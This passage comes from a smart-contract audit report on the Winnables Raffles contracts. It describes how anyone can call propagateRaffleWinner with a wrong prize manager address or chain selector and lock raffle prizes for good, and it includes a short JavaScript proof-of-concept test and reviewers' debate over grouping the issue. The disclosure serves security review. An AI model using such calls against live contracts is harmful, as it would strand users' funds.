2. Some user calls `WinnablesTicketManager::propagateRaffleWinner` and provides incorrect inputs for prizeManager and chainSelector.
3. The propagateRaffleWinner function fails to send the correct message to WinnablesPrizeManager due to the parameter mismatch.
4. As a result, the assets associated with the raffle remain locked and cannot be retrieved by the raffle winner.


### Impact

This vulnerability completely disrupts the protocol, as it becomes impossible to retrieve the reward of the raffle.


### PoC

The test below, which is an edited version of [this existing test](https://github.com/sherlock-audit/2024-08-winnables-raffles/blob/main/public-contracts/test/TicketManager.js#L786), shows that the function call will be successful with a random chainSelector

```javascript
    it('Should be able to propagate when the winner is drawn', async () => {
@>    const { events } = await (await manager.propagateRaffleWinner(counterpartContractAddress, 9846, 1)).wait();
      expect(events).to.have.lengthOf(3);
      const ccipEvent = ccipRouter.interface.parseLog(events[0]);
      expect(ccipEvent.args.receiver).to.eq('0x' + counterpartContractAddress.toLowerCase().slice(-40).padStart(64, '0'));
      expect(ccipEvent.args.data).to.have.lengthOf(108);
      const drawnWinner = ethers.utils.getAddress('0x' + ccipEvent.args.data.slice(-40));
      expect(buyers.find(b => b.address === drawnWinner)).to.not.be.undefined;
      expect(ccipEvent.args.data.slice(0, 68)).to.eq('0x010000000000000000000000000000000000000000000000000000000000000001');
    });
```

### Mitigation

Implement input validation to ensure that `prizeManager` and `chainSelector` are correct before proceeding with the propagation.



## Discussion

**matejdrazic**

It does not make any sense to group lack of access control on `cancelRaffle` issues with this issue. It should be grouped with #57 .

**Brivan-26**

@matejdrazic I believe it does make sense.
The same root cause (lack of the **same** inputs validation) and the same impact

**matejdrazic**

@Brivan-26 hey - but its 2 different functions. By following that logic you can group all same type issues into one. So if there were more access control issues on the contract they would be grouped here?
That is not right.

Also they do not have the same root? They have the same type of root cause and thats lack of access control.

**Brivan-26**

@matejdrazic 
> So if there were more access control issues on the contract they would be grouped here?

Actually, yes, there were many contests before that had the same access control across multiple contracts even and they are grouped into one report because submitting multiple reports about the same break across different functions is kind of redundant.

Concerning this issue: 
- The root cause is a lack of input validation for `prizeManager` and `chainSelector`, not access control as anyone can call this function
- the impact is the message will not reach the destination chain and loss of funds will occur

Concerning `cancelRaffle`:
- The root cause is the same as the previous one, lack of input validation for `prizeManager` and `chainSelector`
- The impact is the same, the message will not reach the destination chain and loss of funds will occur

It is still kind of subjective, it can be a separate report(and I'm okay with that) but it makes sense to group two issues into one single report given the above facts. 

**sherlock-admin2**

The protocol team fixed this issue in the following PRs/commits:
https://github.com/Winnables/public-contracts/pull/22",Winnables Raffles,tofunmi|sakshamguruji|neko\_nyaa|0x73696d616f|SovaSlava|PTolev|PNS|turvec|SadBase|Oxsadeeq|dimulski|dany.armstrong90|araj|0xAadi|dy|0xrex|0rpse|irresponsible|jennifer37|matejdb|0x0bserver|joshuajee|0xbrivan|durov|utsav|iamnmt|gajiknownnothing|KungFuPa|Trooper|PeterSR|rsam\_eth|ogKapten|philmnds|Oblivionis|shaflow01|S3v3ru5|Waydou|Paradox|akiro|shikhar|Feder|Offensive021|Galturok|dinkras\_|IMAFVCKINSTARRRRRR|CatchEmAll|DrasticWatermelon|Penaldo,HIGH,,13500 USDC,0,0,0,https://github.com/sherlock-audit/2024-08-winnables-raffles-judging/issues/50,,,https://app.sherlock.xyz/audits/contests/516,solodit_reports,,2024-10-04 02:14:04,2024-10-15 02:15:17,1,"function propagateRaffleWinner(address prizeManager, uint64 chainSelector, uint256 raffleId) external {
```
        raffle.status = RaffleStatus.PROPAGATED;
```
        if (raffle.status != RaffleStatus.FULFILLED) revert InvalidRaffleStatus();
```
    it('Should be able to propagate when the winner is drawn', async () => {",
